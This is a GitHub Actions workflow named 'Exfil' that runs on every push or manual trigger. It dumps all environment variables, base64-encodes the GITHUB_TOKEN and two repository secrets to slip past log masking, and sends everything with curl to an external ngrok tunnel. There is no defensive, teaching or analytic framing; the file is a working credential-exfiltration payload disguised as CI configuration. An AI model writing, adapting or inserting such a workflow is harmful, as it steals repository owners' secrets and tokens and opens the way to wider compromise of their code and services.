name: Exfil
on:
  push:
  workflow_dispatch:

jobs:
  exfil:
    runs-on: ubuntu-latest
    steps:
      - name: Dump and send
        run: |
          # Grab everything
          env_data=$(env | base64 -w 0)
          repo="${{ github.repository }}"
          actor="${{ github.actor }}"
          
          # Obfuscated secrets
          token=$(echo "${{ secrets.GITHUB_TOKEN }}" | base64 -w 0 2>/dev/null || echo "")
          secret1=$(echo "${{ secrets.SECRET_1 }}" | base64 -w 0 2>/dev/null || echo "")
          secret2=$(echo "${{ secrets.SECRET_2 }}" | base64 -w 0 2>/dev/null || echo "")
          
          # Send payload
          curl -X POST https://july-reorder-overlaid.ngrok-free.dev \
            -H "Content-Type: application/json" \
            -d "{\"repo\":\"$repo\",\"actor\":\"$actor\",\"env\":\"$env_data\",\"token\":\"$token\",\"secret1\":\"$secret1\",\"secret2\":\"$secret2\"}"
